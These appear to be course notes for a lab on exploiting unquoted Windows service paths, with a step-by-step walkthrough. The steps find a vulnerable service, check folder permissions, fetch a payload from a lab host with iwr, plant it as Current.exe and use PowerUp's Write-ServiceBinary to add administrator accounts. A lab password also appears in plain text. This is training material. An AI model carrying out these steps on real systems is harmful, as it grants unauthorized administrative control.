# Unquoted Service Paths

Example of how Windows will try to locate the correct path of an unquoted service
>``` shell
>C:\Program.exe
>C:\Program Files\My.exe
>C:\Program Files\My Program\My.exe
>C:\Program Files\My Program\My service\service.exe
>```

List of services with binary path
>``` shell
>PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
>
># ========== Expected Result ==========
>Name                      State   PathName
>----                      -----   --------
>...
>GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
>...
># =====================================
>```

List of services with spaces and missing quotes in the binary path
>``` shell
>C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
>
># ========== Expected Result ==========
>Name                                       PathName                                                                     
>...                                                                                                         
>GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
># =====================================
>```

Using Start-Service and Stop-Service to check if user steve has permissions to start and stop GammaService
>``` shell
>PS C:\Users\steve> Start-Service GammaService
>
># ========== Expected Result ==========
>WARNING: Waiting for service 'GammaService (GammaService)' to start...
># =====================================
>
>PS C:\Users\steve> Stop-Service GammaService
>```

How Windows tries to locate the correct path of the unquoted service GammaService
>``` shell
>C:\Program.exe
>C:\Program Files\Enterprise.exe
>C:\Program Files\Enterprise Apps\Current.exe
>C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
>```

Reviewing permissions on the paths C:\ and C:\Program Files\
>``` shell
>PS C:\Users\steve> icacls "C:\"
>
># ========== Expected Result ==========
>C:\ BUILTIN\Administrators:(OI)(CI)(F)
>    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
>    BUILTIN\Users:(OI)(CI)(RX)
>    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
>    NT AUTHORITY\Authenticated Users:(AD)
>    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
>    
>Successfully processed 1 files; Failed processing 0 files
># =====================================
>
>PS C:\Users\steve>icacls "C:\Program Files"
>
># ========== Expected Result ==========
>C:\Program Files NT SERVICE\TrustedInstaller:(F)
>                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
>                 NT AUTHORITY\SYSTEM:(M)
>                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
>                 BUILTIN\Administrators:(M)
>                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
>                 BUILTIN\Users:(RX)
>                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
>                 CREATOR OWNER:(OI)(CI)(IO)(F)
>...
>
>Successfully processed 1 files; Failed processing 0 files
># =====================================
>```

Reviewing permissions on the Enterprise Apps directory
>``` shell
>PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
>
># ========== Expected Result ==========
>C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
>                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
>                                 BUILTIN\Administrators:(OI)(CI)(F)
>                                 BUILTIN\Users:(OI)(CI)(RX,W)
>                                 CREATOR OWNER:(OI)(CI)(IO)(F)
>                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
>                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
>
>Successfully processed 1 files; Failed processing 0 files
># =====================================
>```

Download adduser.exe, save it as Current.exe, and copy it to Enterprise Apps directory
>``` shell
>PS C:\Users\steve> iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe
>
>PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
>```

Start service GammaService and confirm that dave2 was created as member of local Administrators group
>``` shell
>PS C:\Users\steve> Start-Service GammaService
>
># ========== Expected Result ==========
>Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
>service GammaService on computer '.'.
>At line:1 char:1
>+ Start-Service GammaService
>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
>   ServiceCommandException
>    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
># =====================================
>
>PS C:\Users\steve> net user
>
># ========== Expected Result ==========
>Administrator            BackupAdmin              dave
>dave2                    daveadmin                DefaultAccount
>Guest                    offsec                   steve
>WDAGUtilityAccount
>The command completed successfully.
># =====================================
>
>PS C:\Users\steve> net localgroup administrators
>
># ========== Expected Result ==========
>...
>Members
>
>-------------------------------------------------------------------------------
>Administrator
>BackupAdmin
>dave2
>daveadmin
>offsec
>The command completed successfully.
># =====================================
>```

Using Get-UnquotedService to list potential vulnerable services
>``` shell
>PS C:\Users\steve> iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
>
>PS C:\Users\steve> powershell -ep bypass
>
># ========== Expected Result ==========
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
># =====================================
>
>PS C:\Users\steve> . .\PowerUp.ps1
>
>PS C:\Users\steve> Get-UnquotedService
>
># ========== Expected Result ==========
>ServiceName    : GammaService
>Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
>                 Permissions=AppendData/AddSubdirectory}
>StartName      : LocalSystem
>AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
>CanRestart     : True
>Name           : GammaService
>
>ServiceName    : GammaService
>Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
>ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
>                 Permissions=System.Object[]}
>StartName      : LocalSystem
>AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
>CanRestart     : True
>Name           : GammaService
>...
># =====================================
>```

Using the AbuseFunction to exploit the unquoted service path of GammaService
>``` shell
>PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
>
># ========== Expected Result ==========
>ServiceName  Path                                         Command
>-----------  ----                                         -------
>GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...
># =====================================
>
>PS C:\Users\steve> Restart-Service GammaService
>
># ========== Expected Result ==========
>WARNING: Waiting for service 'GammaService (GammaService)' to start...
>Restart-Service : Failed to start service 'GammaService (GammaService)'.
>At line:1 char:1
>+ Restart-Service GammaService
>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
>   , ServiceCommandException
>    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand
># =====================================
>
>PS C:\Users\steve> net user
>
># ========== Expected Result ==========
>User accounts for \\CLIENTWK220
>
>-------------------------------------------------------------------------------
>Administrator            BackupAdmin              dave
>dave2                    daveadmin                DefaultAccount
>Guest                    john            offsec
>steve                    WDAGUtilityAccount
>
>The command completed successfully.
># =====================================
>
>PS C:\Users\steve> net localgroup administrators
>
># ========== Expected Result ==========
>...
>john
>...
># =====================================
>```

Lab 1 - Follow the steps from this section on CLIENTWK220 (VM #1) to exploit the unquoted service path of GammaService. Obtain code execution, an interactive shell, or access to the GUI as an administrative user and find the flag on the desktop of daveadmin.
>``` shell
>
>```
>

Lab 2 - Connect to CLIENTWK221 (VM #2) via RDP as user damian with the password ICannotThinkOfAPassword1!. Enumerate the services and find an unquoted service binary path containing spaces. Exploit it with methods from this section and obtain an interactive shell as the user running the service. Find the flag on the desktop.
>``` shell
>
>```
>
